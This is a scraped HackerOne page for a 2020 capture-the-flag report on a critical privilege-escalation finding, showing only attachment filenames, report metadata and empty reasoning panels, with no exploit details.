- F861727: [Upgrade\_Admin\_2\_functions\_tab4.JPG]([REDACTED-SIGNED-URL] "Upgrade_Admin_2_functions_tab4.JPG")

- F861728: [Upgrade\_Admin\_3\_functions\_tab4.JPG]([REDACTED-SIGNED-URL] "Upgrade_Admin_3_functions_tab4.JPG")

- F861730: [Report\_This\_Page\_2.JPG]([REDACTED-SIGNED-URL] "Report_This_Page_2.JPG")

- F861731: [Upgrade\_Admin\_4\_functions\_tab4.JPG]([REDACTED-SIGNED-URL] "Upgrade_Admin_4_functions_tab4.JPG")

- F861733: [Challenge\_Completed.JPG]([REDACTED-SIGNED-URL] "Challenge_Completed.JPG")

- F861734: [Collaborator\_Exfiltration.JPG]([REDACTED-SIGNED-URL] "Collaborator_Exfiltration.JPG")

- F861735: [Login\_Marten\_Mickos.JPG]([REDACTED-SIGNED-URL] "Login_Marten_Mickos.JPG")

- F861736: [Request\_Collaborator\_Exfiltration.JPG]([REDACTED-SIGNED-URL] "Request_Collaborator_Exfiltration.JPG")

- F861737: [Second\_2FA\_Marten\_Mickos.JPG]([REDACTED-SIGNED-URL] "Second_2FA_Marten_Mickos.JPG")

- F861738: [Transacciones.JPG]([REDACTED-SIGNED-URL] "Transacciones.JPG")

- F861740: [2FA\_Pay.JPG]([REDACTED-SIGNED-URL] "2FA_Pay.JPG")


Reported on

June 10, 2020, 5:14am UTC

Reported by

![bcobain23](https://profile-photos.hackerone-user-content.com/variants/UjFcwnsggEsnHx3RA2m3XER5/f4770e29726b679d8210b3bcebb50139392345e8ead50e7d67de79a93076e327)

[bcobain23](https://hackerone.com/bcobain23)

Reported to

**[h1-ctf](https://hackerone.com/h1-ctf)**

Participants

[![bcobain23](https://profile-photos.hackerone-user-content.com/variants/UjFcwnsggEsnHx3RA2m3XER5/f4770e29726b679d8210b3bcebb50139392345e8ead50e7d67de79a93076e327)](https://hackerone.com/bcobain23)

[![nahamsec](https://profile-photos.hackerone-user-content.com/variants/fbbne6p2au4kay4h5dr63g12wtd0/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9)](https://hackerone.com/nahamsec)

Report Id

[#895172](https://hackerone.com/reports/895172)

Resolved

Severity

Critical (9 ~ 10)

* * *

Disclosed

June 22, 2020, 8:59pm UTC

Weakness

Privilege Escalation

CVE ID

None

* * *

Bounty

None

Retest

None

Total reward

None

* * *

Account details

None

* * *

StripeM-Inner

## Validation Agent Reasoning

CloseClose

Disagree with the reasoning?Let us know

## Exploit Agent Reasoning

CloseClose

## Linear Agent Reasoning

CloseClose